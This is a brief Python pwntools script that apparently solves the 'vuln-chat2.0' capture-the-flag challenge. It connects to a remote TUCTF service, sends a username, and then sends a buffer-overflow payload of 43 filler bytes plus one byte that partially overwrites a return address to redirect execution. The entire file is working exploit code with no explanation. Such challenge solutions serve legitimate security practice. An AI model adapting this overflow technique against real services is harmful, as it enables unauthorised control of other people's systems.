from pwn import *

flag = "\x72"
#vuln2 = process("./vuln-chat2.0")
vuln2 = remote("vulnchat2.tuctf.com", 4242)
vuln2.sendlineafter("Enter your username: ","AAAA")
vuln2.recvuntil("AAAA: ")
payload = "A" * 43 + flag
vuln2.send(payload)
print vuln2.recv(1024)
